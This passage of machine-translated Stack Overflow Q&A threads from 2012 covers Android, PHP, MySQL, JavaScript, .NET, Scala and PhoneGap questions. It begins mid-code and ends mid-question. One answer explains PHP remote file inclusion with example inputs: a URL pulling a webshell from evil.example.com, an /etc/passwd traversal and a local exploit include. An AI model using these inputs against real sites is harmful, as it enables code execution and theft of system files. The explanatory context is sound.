    private static final int DEFAULT_MOVIEW_DURATION = 1000;

    private int mMovieResourceId;
    private Movie mMovie;

    private long mMovieStart = 0;
    private int mCurrentAnimationTime = 0;
public Context context;
    @SuppressLint("NewApi")
    public PlayGifView(Context context, AttributeSet attrs) {
        super(context, attrs);
        this.context = context;
       /**
        * Starting from HONEYCOMB have to turn off HardWare acceleration to draw
        * Movie on Canvas.
        */
       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
           setLayerType(View.LAYER_TYPE_SOFTWARE, null);
       }

   }

    public void setImageResource(int mvId){
        this.mMovieResourceId = mvId;
       mMovie = Movie.decodeStream(getResources().openRawResource(mMovieResourceId));
       requestLayout();
    }

    public void setMovieData(Movie movieImg){
        mMovie = movieImg;
        requestLayout();
    }

@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
   if(mMovie != null){

       //Find higest
       int exceptedSize = 200;
       int highest = 0;
       int quality = 0;
       if(mMovie.height()>mMovie.width()){
           highest=mMovie.height();
       }else{
           highest=mMovie.width();
       }

       //Get Display Size
       Display display = ((Activity) getContext()).getWindowManager().getDefaultDisplay();
       Point size = new Point();
       display.getSize(size);

       setMeasuredDimension((int)(((float)mMovie.width()/(float)highest)*((float) size.x))
               , (int)(((float)mMovie.height()/(float)highest)*((float)size.x)));
   }else{
       setMeasuredDimension(getSuggestedMinimumWidth(), getSuggestedMinimumHeight());
   }
}

@Override
protected void onDraw(Canvas canvas) {
   if (mMovie != null){
       updateAnimtionTime();

       //Get Display Size
       Display display = ((Activity) getContext()).getWindowManager().getDefaultDisplay();
       Point size = new Point();
       display.getSize(size);

       float scale = Math.max((float) canvas.getHeight() / (float) mMovie.height(), (float) canvas.getWidth() / (float) mMovie.width());

       canvas.scale(scale, scale);
       canvas.translate(((float) size.x / scale - (float) mMovie.width()) / 2f,
               0);

       drawGif(canvas);
       invalidate();
   }else{
//       drawGif(canvas);
   }
}

private void updateAnimtionTime() {
   long now = android.os.SystemClock.uptimeMillis();

   if (mMovieStart == 0) {
       mMovieStart = now;
   }
   int dur = mMovie.duration();
   if (dur == 0) {
       dur = DEFAULT_MOVIEW_DURATION;
   }
   mCurrentAnimationTime = (int) ((now - mMovieStart) % dur);
}

private void drawGif(Canvas canvas) {
   mMovie.setTime(mCurrentAnimationTime);
   mMovie.draw(canvas, 0, 0);
   canvas.restore();
}

} 
```

***主要活动.class***

```
PlayGifView pGif = findViewById(R.id.viewGif);
pGif.setImageResource(R.drawable.ads1); 
```

***activity_main.xml***

```
<com.---- Yours-----.PlayGifView
    android:id="@+id/viewGif"
    android:gravity="center"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" /> 
```

# android - Android - 附加调试工具时故意使应用程序崩溃

> ID：11702780
> 
> 赞同：0
> 
> 时间：2012-07-28T16:35:21.720
> 
> 标签：android, crash

我想检测是否有任何调试工具附加到 android 设备。我想要这个功能，这样当应用程序发布给人们时，没有人可以看到日志。

问候。

PS：

即使在生产环境中，我也想写日志，因为它们会帮助我微调我的应用程序，但不希望其他人看到它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:44:52.433

如果不是系统应用程序，您无法检测是否连接或启用了 USB 调试。但是，我们可以讨论如何解决您的问题。如果您不希望您的应用程序登录您的官方市场版本，有几种可接受的方法来解决它，

**有条件地登录。**像这样包装所有日志消息，

```
if (DEBUG) Log.d(...); 
```

在构建官方市场 APK 之前，`DEBUG`在代码中设置为 false。一个更好的方法是在android的记录器周围添加一个包装方法或类。例如，写一个这样的方法，

```
void d(String msg) {
  if (DEBUG) Log.d(msg);
} 
```

**使用proguard。** [proguard](http://developer.android.com/tools/help/proguard.html)是一个编译后操作字节码的工具。您可以使用它从代码中删除所有日志记录（除其他外）。使用 proguard 的学习曲线很安静，但它非常强大。

这是另一篇文章，对该主题进行了深入讨论。

[如何在 Android 中启用/禁用日志级别？](https://stackoverflow.com/questions/2018263/android-logging)

# php - 如何使用 PHP/MySQL 插入大量数据？

> ID：11702781
> 
> 赞同：2
> 
> 时间：2012-07-28T16:35:47.273
> 
> 标签：php, mysql, insert, bulkinsert

我目前正在为客户编写赌博系统，有效地，系统的工作方式如下：

*   门票是我们创造的
*   每张票将被分配一定数量的每张票
*   共有 1,000,000 个，从 000,000 到 999,999 随机排序
*   这 100 万个号码被分成票，每张票的号码数量由管理员定义。

现在的问题是目前我们有一个随机排序的 100 万个数字的数组，这很好，但是将其插入数据库的最佳方法是什么？

我们有两张桌子

**门票**

*   ID
*   票证UID
*   奖品ID
*   添加日期

**票号**

*   ID
*   票号
*   数字

当用户决定将票添加到奖品中时，我们循环并创建由每张票的总数决定的总票，例如每张票 1 个号码 = 100 万张票，等等......

现在我们循环检查每张票的总数，从我们的数字数组中添加多少，然后从原始数组中删除它，这样就没有重复的数字。

现在问题出在哪里，这会以这种方式占用大量内存，并导致页面超时......

有人可以提出其他方法来帮助解决这个问题吗？

PS我不能提供源代码，但这本质上就是我们正在做的事情，我真正需要的是关于如何处理所有这些数据的插入的其他方法的理论。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:56:09.200

我不是很喜欢赌博，所以不确定这些票与赌博有什么关系。

也就是说，如果您真的需要创建如此大量的数据，则有几种选择。例如，您可以将票证创建远离用户。我的意思是，每当用户决定“将门票添加到奖品中”时，您将此任务委托给另一个进程/线程并让用户继续前进。然后，当票证的创建完成时，该过程会以某种方式通知用户。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:57:16.890

如果不尝试一些东西，我现在想不出一个最好的解决方案 - 你真的必须首先将数字保存在数据库中吗？如果它的普通数字从 000000 到 999999，那么您可以即时生成它们，这可能会更有效。

为了普遍克服超时问题，您可以随时增加默认 php 超时或完全禁用此特定任务：

```
//set php script timeout, 0 to disable 
set_time_limit(0); 

// your time consuming code 

//don't forget to reset to 30 seconds. 
set_time_limit(30); 
```

# macos - 有没有办法在mac版中获取嵌入式终端gedit插件？

> ID：11702783
> 
> 赞同：3
> 
> 时间：2012-07-28T16:36:26.507
> 
> 标签：macos, gedit

我下载了gedit for mac，插件选择首选项中似乎没有嵌入式终端插件。

有没有办法得到它？

# android - Google PlayStore 发布

> ID：11702789
> 
> 赞同：2
> 
> 时间：2012-07-28T16:37:52.250
> 
> 标签：android, google-play, publishing

我在 google playstore 开发者面板上注册了。我付了 25 美元和一切。剩下的唯一一件事是我需要注册谷歌结帐商家，但在注册表格上我被要求填写公司信息。问题是我想以个人而非公司的身份出售我的游戏。那不可能吗？

如果有人可以告诉我一些替代品，比如出版商吗？也许给我一份受信任的名单？任何帮助都会很棒:)

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:49:01.103

不，您不需要公司名称。这是将在市场中您的应用程序下显示的名称，您以后可以随时更改它。

看看这里：

[http://support.google.com/googleplay/android-developer/bin/answer.py?hl=en&answer=113468&ctx=cb&src=cb&cbid=m3bohg8w3bmo](http://support.google.com/googleplay/android-developer/bin/answer.py?hl=en&answer=113468&ctx=cb&src=cb&cbid=m3bohg8w3bmo)

[http://support.google.com/googleplay/android-developer/?hl=en](http://support.google.com/googleplay/android-developer/?hl=en)

# javascript - 计算订单总额：应用折扣

> ID：11702792
> 
> 赞同：0
> 
> 时间：2012-07-28T16:38:00.220
> 
> 标签：javascript, arrays, forms

我正在使用 javascript 处理在线订单。我几乎可以使用它，但是如果选择了 5 个以上的商品，我想做的是应用 12.5% 的折扣。到目前为止，如果选择了多个项目，我已经设法获得折扣。这是我的代码：

```
var totalItems = 0

// Run through the form fields to check for any filled fields
for (var i=0; i<juiceForm.length; i++)
{

    n=0;
    juicetotal = 0;
    itemQuantity = Number(parseInt(juiceForm[i].value)); // convert field value to a number

    itemQuantity = parseInt(juiceForm[i].value);
    if (isNaN(itemQuantity)) 
    {
        itemQuantity = 0; // If the form field value is not a number, make it zero
    }

    // count the total number of juices selected
    totalItems = totalItems += Number(parseInt(juiceForm[i].value));

    if (totalItems >= 5 || itemQuantity >= 5 || (totalItems + itemQuantity) >= 5)
    {
        juiceTotal = (juiceTotal+(itemQuantity * juicePrice[i]))*0.875;
    }
    else 
    {
    // Multiply the quantity by the item price and update the order total   
        juiceTotal = juiceTotal+(itemQuantity * juicePrice[i]);
    }
} 
```

我遇到麻烦的地方是，如果选择了多个项目总共超过 5 个项目，那么计算就会出错。例如，如果我有 5 箱 20 英镑的苹果汁和 1 箱 22 英镑的橙子，加上 12.5% 的折扣，我总共应该得到 106.75 英镑，但我得到的是 95.81 英镑。

我不确定我是否犯了明显的错误。谁能给我任何关于我做错了什么的建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:03:30.520

可能你想到了这个（未测试，当作伪代码）

```
var totalItems = 0
var juiceTotal = 0;
for (var i=0; i<juiceForm.length; i++)
{
    var itemQuantity = parseInt(juiceForm[i].value);
    if (isNaN(itemQuantity)) 
    {
        itemQuantity = 0;
    }
    totalItems += itemQuantity;
    juiceTotal += (juicePrice[i]*itemQuantity);  
}

if (totalItems >= 5)
    juiceTotal *= 0.875;
} 
```

# mysql - 如何删除 MySQL 中的重复行？

> ID：11702793
> 
> 赞同：0
> 
> 时间：2012-07-28T16:38:00.160
> 
> 标签：mysql

我在 MySQL 数据库中有一些行是重复的，除了它们的 ID 号。

例如，我可能将其分为两行：

```
ID   | wordlist | category
845  | abashed  | confused
1800 | abashed  | confused 
```

我想把它们都找出来，只留下一个。

我可以使用 SQL 来执行此操作，还是需要编写某种程序？

为了澄清，我只想在 wordlist 部分中获得重复项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:10:06.350

`DELETE`您可以在语句中使用外部联接来执行此操作：

```
DELETE a FROM tbl a
LEFT JOIN
(
    SELECT MIN(id) AS id
    FROM tbl
    GROUP BY wordlist
) b ON a.id = b.id
WHERE a.category = '<category here>' AND b.id IS NULL 
```

`wordlist`这将仅消除特定类别的重复项（在列中），并保留最低的类别`id`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:42:53.140

```
ALTER IGNORE TABLE your_table ADD UNIQUE INDEX idx_wordlist (wordlist ); 
```

# .net - 当两个线程试图同时锁定同一个资源时会发生什么？

> ID：11702794
> 
> 赞同：4
> 
> 时间：2012-07-28T16:38:01.017
> 
> 标签：.net, multithreading, locking

当两个线程试图在完全相同的微秒内（或任何可以测量 CPU 片或指令的最短时间长度）锁定同一个对象时会发生什么？

两个线程是否有可能在完全相同的并发时间执行指令，或者这对于今天的硬件来说是不可能的？

我正在从事一个处理多线程的项目，可以这么说，任何线程都可能击败另一个线程到达终点线。所以很自然地，“当它们都同时锁定时会发生什么？”的问题。必须解决 IMO。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T17:23:11.540

这是不可能的，锁无法做到他们所承诺的。这需要处理器支持，因为它是唯一可以确保多个内核不会尝试同时访问同一内存位置的处理器。一个示例是这段汇编代码，由 x86 版本的 CLR 在其 Monitor.TryEnter() 方法中使用：

```
FASTCALL_FUNC CompareExchangeUP,12
        _ASSERT_ALIGNED_4_X86 ecx
        mov     eax, [esp+4]    ; Comparand
        cmpxchg [ecx], edx
        retn    4               ; result in EAX
FASTCALL_ENDFUNC CompareExchangeUP 
```

`cmpxchg`处理器指令提供原子性保证。这是任何现代内核都具有的指令，它的通用名称是“比较和交换”。[您将在此Wikipedia 文章](http://en.wikipedia.org/wiki/Compare-and-swap)中找到有关此说明的更多信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-28T16:40:44.763

在几乎所有环境中，现代锁的设计都使得两个线程不可能同时锁定一个对象。现代处理器有可能在两个不同的内核*上*运行两个线程几乎同时尝试获取锁，但它们都实现了允许软件告诉它们不允许的同步机制。

例如，x86-64 有[MONITOR](http://www.rz.uni-karlsruhe.de/rz/docs/VTune/reference/MONITOR--Setup_Monitor_Address.htm)和[MWAIT](http://www.rz.uni-karlsruhe.de/rz/docs/VTune/reference/MWAIT--Monitor_Wait.htm)指令。它们本质上在微处理器级别实现了 .NET和.NET`lock(){}`的语义。`System.Threading.Monitor.Wait()``System.Threading.Monitor.Enter()/.Exit()`

# c# - 在“Paint”函数中获取数据网格中一行中单元格的值？

> ID：11702795
> 
> 赞同：0
> 
> 时间：2012-07-28T16:38:03.237
> 
> 标签：c#, .net, winforms, compact-framework

我已经继承`datagridcolumnstyle`并且在 Paint 函数中我需要根据正在渲染的行中的单元格做一些事情。

例如，我有以下内容：

```
row 1: color1, name, last name
row 2: color2, name2, last name2
row 3: color3, name3, last name3 
```

name 和 last name 列需要使用颜色列中定义的颜色进行绘制。

因此，当`datagridcolumnstyle`绘制与 name2 相关的内容时，我需要能够执行以下操作：

```
protected override void Paint( Graphics g, Rectangle bounds, CurrencyManager source, int rowNum, Brush backBrush, Brush foreBrush, bool alignToRight )
{
Color color = (Color)GetRow( rowNum ).GetCell(color1).Value;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T13:54:42.237

`DataGridColumnStyle`我使用过的简单解决方案是在创建自定义对象时将对拥有的 DatGrid 的引用传递给您的自定义对象。这可以通过构造函数或属性来完成。然后您可以在`Paint`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-30T02:02:45.160

我不知道这是什么或如何让它工作，但这里是 Microsoft 的[DataGridColumnStyle 类](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridcolumnstyle%28v=vs.71%29.aspx)示例中显示的示例：

```
protected override void Paint(Graphics g, Rectangle bounds, CurrencyManager source, int rowNum,
    Brush backBrush, Brush foreBrush, bool alignToRight) {
  DateTime date = (DateTime)GetColumnValueAtRow(source, rowNum);
  Rectangle rect = bounds;
  g.FillRectangle(backBrush, rect);
  rect.Offset(0, 2);
  rect.Height -= 2;
  g.DrawString(date.ToString("d"), this.DataGridTableStyle.DataGrid.Font, foreBrush, rect);
} 
```

基于那段代码，我想说这个工具的原因是从提供的坐标处的单元格中读取值并根据该值更改颜色。

因此，如果该值无效，您可以将单元格涂成红色。

如果该值未保存，您可以将字体设置为粗体。

但是，我发布的示例非常不适用于 Windows Mobile！

# php - 什么是运输安全？

> ID：11702796
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:38:12.640
> 
> 标签：php, security, http, fopen

我看到它在这个问题中提到：

[包含一个远程 php 文件作为资源](https://stackoverflow.com/questions/8744156/including-a-remote-php-file-as-a-resource)

那么有人如何“拦截”（并修改？）正在发送/接收的数据？（在那个问题中，它是一个用 fopen 读取的远程 PHP 文件）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:45:21.523

您可能想阅读有关[中间人攻击](http://en.wikipedia.org/wiki/Man-in-the-middle_attack)的 Wikipedia 文章。

正如 PeeHaa 指出的那样，您可以使用 HTTPS 使用 SSL/TLS 加密您的 HTTP 流。

MITM 攻击不是 HTTP 特定的问题。此问题会影响流经不受信任网络的所有通信。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:55:15.223

这个来自[维基百科](http://en.wikipedia.org/wiki/Remote_file_inclusion)的例子可能会让你认识到不良影响。

```
<?php
   $color = 'blue';
   if (isset( $_GET['COLOR'] ) )
      $color = $_GET['COLOR'];
   include( $color . '.php' );
?> 
```

1.  COLOR=http://evil.example.com/webshel​​l.txt - 注入包含恶意代码的远程托管文件

2.  COLOR=/etc/passwd - 允许攻击者在 UNIX 系统目录遍历上读取 passwd 文件的内容

3.  /vulnerable.php?COLOR=C:\ftp\upload\exploit - 从已上传的名为exploit.php的文件中执行代码（本地文件包含漏洞）

我希望从这些例子中，潜伏的危险对你来说更清楚。

“脚本之外的不受信任的数据需要验证”以减轻这些攻击。

# scala - scala，返回类型指南 - 当更喜欢 seq、iterable、traversable

> ID：11702798
> 
> 赞同：55
> 
> 时间：2012-07-28T16:38:22.597
> 
> 标签：scala

您何时选择将给定函数的返回类型键入为`Seq`vs `Iterable`vs `Traversable`（或者甚至在`Seq`的层次结构中更深）？

你如何做出这个决定？我们有很多`Seq`默认返回 s 的代码（通常从数据库查询和连续转换的结果开始）。我倾向于在`Traversable`默认情况下以及`Seq`在特别期望给定订单时创建返回类型。但我没有这样做的充分理由。

我非常熟悉每个特征的定义，所以请不要用定义术语来回答。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-07-28T17:09:57.787

这是一个很好的问题。您必须平衡两个问题：

*   (1) 尽量保持你的 API 通用，以便以后可以更改实现
*   (2) 给调用者一些有用的操作来对集合执行

其中 (1) 要求您尽可能少地具体说明类型（例如`Iterable`over `Seq`），而 (2) 要求您相反。

即使返回类型是 just `Iterable`，你仍然可以返回让我们说 a `Vector`，所以如果调用者希望获得额外的权力，它可以只调用`.toSeq`or `.toIndexedSeq`，并且该操作对于 a 来说很便宜`Vector`。

作为衡量平衡的标准，我要补充第三点：

*   (3) 使用一种能反映数据组织方式的类型。例如，当您可以假设数据确实有序列时，请给出`Seq`. 如果您可以假设不可能出现两个相等的对象，请给出`Set`. 等等。

以下是我的经验法则：

*   尝试只使用一小组集合：`Set`, `Map`, `Seq`,`IndexedSeq`
*   不过，我经常违反以前的规则，使用`List`支持`Seq`. 它允许调用者使用 cons 提取器进行模式匹配
*   仅使用不可变类型（例如`collection.immutable.Set`，`collection.immutable.IndexedSeq`）
*   不要使用具体实现 ( `Vector`)，而是使用通用类型 (`IndexedSeq` )，而是使用提供相同 API
*   如果您正在封装一个可变结构，只返回`Iterator`实例，那么调用者可以轻松地生成一个严格的结构，例如通过调用`toList`它
*   如果您的 API 很小并且明显针对“大数据吞吐量”进行了调整，请使用`IndexedSeq`

当然，这是我个人的选择，但我希望这听起来很理智。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-05-01T21:38:15.847

*   默认情况下在任何地方使用`Seq`。
*   `IndexedSeq`当您需要按索引访问时使用。
*   仅在特殊情况下使用其他任何东西。

这些是“常识”准则。它们简单、实用，并且在实践中运行良好，同时平衡了原则和性能。原则是：

1.  使用反映数据组织方式的类型（感谢 OP 和 ziggystar）。
2.  在方法参数和返回类型中都使用接口类型。API 的输入和返回类型都受益于通用性的灵活性。

`Seq`满足这两个原则。如[http://docs.scala-lang.org/overviews/collections/seqs.html](http://docs.scala-lang.org/overviews/collections/seqs.html)中所述：

> 序列是一种具有 [有限] 长度且其元素具有固定索引位置的可迭代对象，从 0 开始。

90% 的情况下，您的数据是 Seq。

其他注意事项：

*   `List`是一种实现类型，因此您不应在 API 中使用它。例如，如果不经过转换，就不能将A`Vector`用作 a 。`List`
*   `Iterable`没有定义`length`。 `Iterable`跨有限序列和潜在无限流的抽象。大多数时候，人们都在处理有限序列，所以你“有一个长度”，并`Seq`反映了这一点。通常，您实际上不会使用长度。但它经常需要，而且很容易提供，所以使用`Seq`.

缺点：

这些“常识”约定有一些轻微的缺点。

*   您不能使用 List cons 模式匹配，即`case head :: tail => ...`. 您*可以*使用`:+`和，如此[处](https://stackoverflow.com/a/19147469/1742799)`+:`所述。然而，重要的是，匹配仍然可以按照[Scala：模式匹配 Seq[Nothing]](https://stackoverflow.com/questions/13068080/scala-pattern-matching-seqnothing)中的描述进行。`Nil`

脚注：

*   我不在`Map`这里讨论，因为这个问题，明智地，并没有问到它。
*   我在这里只解决不可变集合。
*   我建议的指导方针与[我应该使用 List[A] 还是 Seq[A] 还是其他东西一致？](https://stackoverflow.com/questions/3634023/should-i-use-lista-or-seqa-or-something-else)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-07-28T16:50:05.800

使您的方法的返回类型尽可能具体。然后，如果调用者想要将其保留为 a`SuperSpecializedHashMap`或将其键入为 a `GenTraversableOnce`，他们可以。这就是编译器默认推断出最具体的类型的原因。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-30T11:09:06.070

我遵循的经验法则是，根据实现，使返回类型尽可能具体，参数类型尽可能通用。这是一个易于遵循的规则，它以最大的自由度为您提供一致的类型属性保证。

`map`比如说，如果你有一个函数实现，它只是用,`filter`或`fold`- 那些在 trait 中实现的方法来遍历数据结构`Traversable`，你可以期望它在任何类型的输入集合上同样执行 - 无论是 a `List`，`Vector`，`HashSet`甚至是 a `HashMap`，因此您的输入参数应指定为`Traversable[T]`。函数输出类型的选择应该只取决于它的实现：在这种情况下也应该`Traversable`如此。但是，如果在您的函数中使用`toList`,`toSeq`或之类的方法将此数据结构强制为某些更具体的类型`toSet`，则应指定适当的类型。注意到实现和返回类型之间的一致性了吗？

如果您的函数通过索引访问 input 的元素，则应将 input 指定为`IndexedSeq`，因为它是最通用的类​​型，可为您提供有效实现 method 的保证`apply`。

在抽象成员的情况下，相同的规则适用，唯一的区别是您应该根据您计划如何使用它们而不是实现来指定返回类型，因此它们通常比实现更通用。分类选择`Seq`，`Set`或`Map`是最值得期待的。

遵循这条规则，您可以保护自己免受非常常见的瓶颈情况的影响，例如，当项目被附加到`List`或被`contains`调用 a`Seq`而不是 a`Set`时，您的程序仍然具有很好的自由度，并且在类型选择方面是一致的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-11-18T02:00:02.447

快速说明：在 Scala 2.13.x 中，`Traversable`是不可能的。 `Iterable`更普遍，并且确定向前发展二元性是不合理的。 `Iterable`现在位于集合层次结构的顶部并且`Traversable`已被弃用。

# php - GD/Imagick 不保存我的图像

> ID：11702801
> 
> 赞同：1
> 
> 时间：2012-07-28T16:38:40.477
> 
> 标签：php, android, gd, imagick

我想从 android 发送图像并将其保存在我的服务器中的 php 代码中。因为我需要保护我的服务器，所以我需要重新处理图像，所以我必须使用 GD 或 Imagick。图像以 base64 编码发送。在 php 文件中被解码，如果我使用：

```
$img=base64_decode($img);
$file = fopen('test.jpg', 'wb');
fwrite($file, $img);
fclose($file); 
```

图像保存在服务器中。如果我使用 Imagick 或 GD，我的图像不会被保存并且 php 文件不会返回任何内容，即使我在它之后插入了一个回显。有什么帮助吗？在 GD 中，我使用的是：

```
$img=base64_decode($img);
$imageinfo = getimagesize($img);
if($imageinfo['mime'] == 'image/gif'{
    $img = @imagecreatefromjpeg($img);
    imagejpeg($img, ""testt.jpg", 80);
} 
```

在想象中：

```
$img=base64_decode($img);
$img = imagick($img); //neither if I use a path of an image saved in my server 
                      //works
$mime = mime_content_type($img);
    switch ($mime):
        case 'image/jpeg':
            $ext = '.jpg';
            break;
    endswitch;

$img->stripImage();
$img->writeImage(""testt".$ext);
$img->clear();
$img->destroy(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:47:31.407

imagick 只适用于文件，不幸的是你无法处理它，所以：

```
$img=base64_decode($img);
$filename = tempnam(sys_get_temp_dir(), 'tempimage_'); 
$file = fopen($filename, 'wb');
fwrite($file, $img);
fclose($file);

$img = imagick($filename);  
$mime = mime_content_type($img);
    switch ($mime):
        case 'image/jpeg':
            $ext = '.jpg';
            break;
   endswitch;

$img->stripImage();
$img->writeImage("testt".$ext);
$img->clear();
$img->destroy(); 
```

从理论上讲，这应该有效。

# objective-c - 如何使用 DictationServices.framework

> ID：11702804
> 
> 赞同：2
> 
> 时间：2012-07-28T16:39:03.403
> 
> 标签：objective-c, private, dictating

Mac 10.8 包含私有的 DictationServices.framework

它永远不会在 App Store 中获得批准，只是出于兴趣：如何利用它的私有类、方法和消息？

```
root:~/DictationServices.framework$ strings DictationServices 
```

揭示以下内容：

*   SOMicrophonePopUpButton SOMicrophoneView SOMicrophoneLevelMeterController SOEnableDictationPanelController SODictationHotKeyController SOEnableDictationDelegate

    logDictationFinished：服务器错误：

    com.apple.message.dictationstatus com.apple.speech.recognition.AppleSpeechRecognition.prefs

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:11:04.123

您是否尝试过使用类转储来提取头文件？只需将这些标头包含在您的项目中并链接到框架即可。

# jquery-mobile - 使用 Jquery 手机和 Phonegap 设备 API 的正确方法

> ID：11702806
> 
> 赞同：1
> 
> 时间：2012-07-28T16:39:40.563
> 
> 标签：jquery-mobile, cordova

我已经在这里阅读了一些类似的帖子，但没有成功。我想做的很简单。我有一个非常小的 jquery 移动应用程序，包含在 phonegap 中。在某个页面上，我希望能够访问设备的相机（比如说在 iPhone 上）。我正在使用 phonegap 相机[文档中的代码](http://docs.phonegap.com/en/2.0.0/cordova_camera_camera.md.html#Camera)

如果我不使用 jquery mobile，代码本身可以正常工作，但是我想使用 JQM 来设置应用程序的样式。

我知道 JQM 使用 ajax 来调用页面，并且有自己的 pageinit() 和 pageshow() 函数。我怎样才能让 phonegap 和 JQM 一起玩得很好，因为两者都需要触发自己的功能（deviceReady() 和 JQM 是初始化页面）。

如果有帮助，这是我的相机页面代码：

```
 <!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name = "format-detection" content = "telephone=no"/>
        <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width;" />
        <link rel="stylesheet" type="text/css" href="css/index.css" />
        <link rel="stylesheet" type="text/css" href="css/jquery.mobile-1.1.1.css" />
        <title>Take Picture</title>

    </head>
    <body>
        <div id="takePicturePage" data-role="page" data-add-back-btn="true">

            <div data-role="header" data-position="fixed" id="hrdHome" data-theme="b">
                <h1>Take a picture</h1>
            </div><!-- /header -->
            <div data-role="content" id="content">

                <button onclick="capturePhoto();">Capture Photo</button>
                <button onclick="capturePhotoEdit();">Capture Editable Photo</button>
                <button onclick="getPhoto(pictureSource.PHOTOLIBRARY);">From Photo Library</button>
                <button onclick="getPhoto(pictureSource.SAVEDPHOTOALBUM);">From Photo Album</button>
                <img style="display:none;width:60px;height:60px;" id="smallImage" src="" />
                <img style="display:none;" id="largeImage" src="" />

            </div><!-- /content -->
         </div>

        <script type="text/javascript" src="cordova-2.0.0.js"></script>
        <script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
        <script type="text/javascript" src="js/jquery.mobile-1.1.1.js"></script>
        <script type="text/javascript" src="js/takePicture.js"></script>
    </body>
</html> 
```

这是我的 takePicture.js：

```
 var pictureSource;   // picture source
var destinationType; // sets the format of returned value 

// Wait for PhoneGap to connect with the device
//
document.addEventListener("deviceready",onDeviceReady,false);

// PhoneGap is ready to be used!
//
function onDeviceReady() {
    pictureSource=navigator.camera.PictureSourceType;
    destinationType=navigator.camera.DestinationType;
}

// Called when a photo is successfully retrieved
//
function onPhotoDataSuccess(imageData) {
  // Uncomment to view the base64 encoded image data
  // console.log(imageData);

  // Get image handle
  //
  var smallImage = document.getElementById('smallImage');

  // Unhide image elements
  //
  smallImage.style.display = 'block';

  // Show the captured photo
  // The inline CSS rules are used to resize the image
  //
  smallImage.src = "data:image/jpeg;base64," + imageData;
}

// Called when a photo is successfully retrieved
//
function onPhotoURISuccess(imageURI) {
  // Uncomment to view the image file URI 
  // console.log(imageURI);

  // Get image handle
  //
  var largeImage = document.getElementById('largeImage');

  // Unhide image elements
  //
  largeImage.style.display = 'block';

  // Show the captured photo
  // The inline CSS rules are used to resize the image
  //
  largeImage.src = imageURI;
}

// A button will call this function
//
function capturePhoto() {
  // Take picture using device camera and retrieve image as base64-encoded string
  navigator.camera.getPicture(onPhotoDataSuccess, onFail, { quality: 50 });
}

// A button will call this function
//
function capturePhotoEdit() {
  // Take picture using device camera, allow edit, and retrieve image as base64-encoded string  
  navigator.camera.getPicture(onPhotoDataSuccess, onFail, { quality: 20, allowEdit: true }); 
}

// A button will call this function
//
function getPhoto(source) {
  // Retrieve image file location from specified source
  navigator.camera.getPicture(onPhotoURISuccess, onFail, { quality: 50, 
    destinationType: destinationType.FILE_URI,
    sourceType: source });
}

// Called if something bad happens.
// 
function onFail(message) {
  alert('Failed because: ' + message);
} 
```

请有人帮忙，因为我看不到两者如何一起工作？

提前谢谢了

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T11:51:43.643

万一它对那里的任何人有用，我最终使用了这个[cordova-jquerymobile-boilerplate](https://github.com/sebbie1o1/cordova-jquerymobile-boilerplate)，它可以解决我所有的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-30T06:26:31.270

你可以在这里找到它[http://jquerymobile.com/test/docs/pages/phonegap.html](http://jquerymobile.com/test/docs/pages/phonegap.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-02T14:15:48.837

你的 js 非常适合我。我正在使用 JQM 1.2.0、cordova 2.0。不过，看起来您并没有准备好调用您的设备，请尝试使用 body onload="onload" 方法，看看是否有帮助？

```
function onLoad() {
document.addEventListener("deviceready", onDeviceReady, false);
} 
```

# regex - 这个空白隐藏在哪里？

> ID：11702812
> 
> 赞同：6
> 
> 时间：2012-07-28T16:40:33.223
> 
> 标签：regex, r

我有一个字符向量，它是通过`pdftotext`（命令行工具）抓取的一些 PDF 文件。

一切都（幸福地）排列整齐。但是，该向量充满了一种无法避免我的正则表达式的空格：

```
> test
[1] "Address:"              "Clinic Information:"   "Store "                "351 South Washburn"    "Aurora Quick Care"    
[6] "Info"                  "St. Oshkosh, WI 54904" "Phone: 920‐232‐0718"   "Pewaukee"  

> grepl("[0-9]+ [A-Za-z ]+",test)
[1] FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE

> dput(test)
c("Address:", "Clinic Information:", "Store ", "351 South Washburn", 
"Aurora Quick Care", "Info", "St. Oshkosh, WI 54904", "Phone: 920‐232‐0718", 
"Pewaukee")

> test.pasted <- c("Address:", "Clinic Information:", "Store ", "351 South Washburn", 
+                  "Aurora Quick Care", "Info", "St. Oshkosh, WI 54904", "Phone: 920‐232‐0718", 
+                  "Pewaukee")

> grepl("[0-9]+ [A-Za-z ]+",test.pasted)
[1] FALSE FALSE FALSE  TRUE FALSE FALSE FALSE FALSE FALSE

> Encoding(test)
